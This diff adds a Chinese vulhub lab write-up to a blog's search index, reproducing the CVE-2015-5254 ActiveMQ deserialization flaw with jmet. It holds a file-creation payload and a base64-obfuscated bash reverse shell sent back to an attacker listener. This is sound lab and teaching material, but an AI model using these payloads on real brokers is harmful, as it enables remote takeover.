@@ -20,4 +20,67 @@
         <category>test1</category>
       </categories>
   </entry>
+  <entry>
+    <title>Apache ActiveMQ序列化漏洞(CVE-2015-5254)复现</title>
+    <url>/2022/03/30/vulhub-cve-2015-5254/</url>
+    <content><![CDATA[<p>一、介绍<br>1.1 简介</p>
+<p>ActiveMQ 是Apache的一款JAVA开源消息中间件，支持Java消息服务、集群、SpringFrameword等。属于消息队列组件。<br>    消息队列组件：分布式系统中的重要组件，主要解决应用耦合、异步消息、流量削峰等</p>
+<p>1.2 影响版本</p>
+<pre><code>    Apache ActiveMQ &lt; 5.x
+</code></pre>
+<p>1.3 漏洞描述</p>
+<p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的java消息服务(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
+<p>1.4 利用限制</p>
+<pre><code>a、版本需要符合
+b、能够立即执行代码：能够有弱密码登录查看消息队列
+c、没有查看队列所有消息的用户名和密码下，只能管理员/用户去点击我们插入的消息才能触发（比较鸡肋，但可以写入创建用户命令等待管理员点击查看，概率很大！）
+</code></pre>
+<p>1.5 可能存在的业务场景</p>
+<p>消息队列在大型电子商务类网站（JD、淘宝等）深入应用，主要消除高并发访问高峰，加快网站响应速度。</p>
+<pre><code>（例如：不使用消息队列用户请求会直接写入数据库，在高并发情况下会对数据库造成大压力，使系统响应延迟加剧。
+在使用消息队列后，用户的请求发给队列后不会立即返回，如有时提交了订单，系统提示：“您提交了订单、请等待系统确认！”
+再由消息队列组件从消息队列中获取数据，异步写入数据库，从而响应延迟得以改善）
+</code></pre>
+<p>二、环境搭建</p>
+<p>vulhub 启动 activemq&#x2F;CVE-2015-5254&#x2F;环境</p>
+<pre><code>命令：docker-compose up -d
+</code></pre>
+<img src="/2022/03/30/vulhub-cve-2015-5254/1.png" class>
+
+<p>三、漏洞复现</p>
+<p>3.1 漏洞利用过程</p>
+<pre><code>a.构成(使用ysoserial)可执行命令的序列化对象
+b.作为一个消息,发送给目标的61616端口    
+c.访问web管理页面,读取消息,触发漏洞
+</code></pre>
+<p>3.2 使用jmet进行漏洞利用</p>
+<pre><code>Github地址：https://github.com/matthiaskaiser/jmet/releases
+</code></pre>
+<p>a、下载jmet<br>b、同级目录下创建external目录<br>c、构造队列消息发送到目标服务器（这里为在目标服务器&#x2F;tmp目录创建一个文件）</p>
+<pre><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y &quot;touch /tmp/success&quot; -Yp ROME [ip] [port]
+</code></pre>
+<img src="/2022/03/30/vulhub-cve-2015-5254/2.png" class>
+
+<p>3.3 访问站点</p>
+<p>访问web站点查看创建的消息队列是否成功（这里前提需要拿到BasicHTML认证的账号密码，这里为了演示admin:admin）<br>访问 <a href="http://110.42.181.61:8161/admin/browse.jsp?JMSDestination=event">http://110.42.181.61:8161/admin/browse.jsp?JMSDestination=event</a></p>
+<img src="/2022/03/30/vulhub-cve-2015-5254/3.png" class>
+
+<p>成功查看到创建的消息队列，当用户点击消息，即可成功执行。</p>
+<img src="/2022/03/30/vulhub-cve-2015-5254/4.png" class>
+<img src="/2022/03/30/vulhub-cve-2015-5254/5.png" class>
+
+<p>可以看到成功执行</p>
+<p>四、漏洞利用（反弹shell）</p>
+<p>a、攻击者首先监听一个端口，例如nc -lvvp 19111<br>b、发送bash弹shell的命令payload到服务器</p>
+<pre><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAxLzE5MTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME [ip] [port]
+</code></pre>
+<p>c、点击访问该事件，payload便会执行（真实攻击场景下，此过程需要等待管理员点击<br>d、成功连接shell</p>
+<p>五、修复建议</p>
+<p>a、升级到最新版本<br>b、有WAF的可以配置相关规则进行拦截</p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+        <category>activemq</category>
+      </categories>
+  </entry>
 </search>
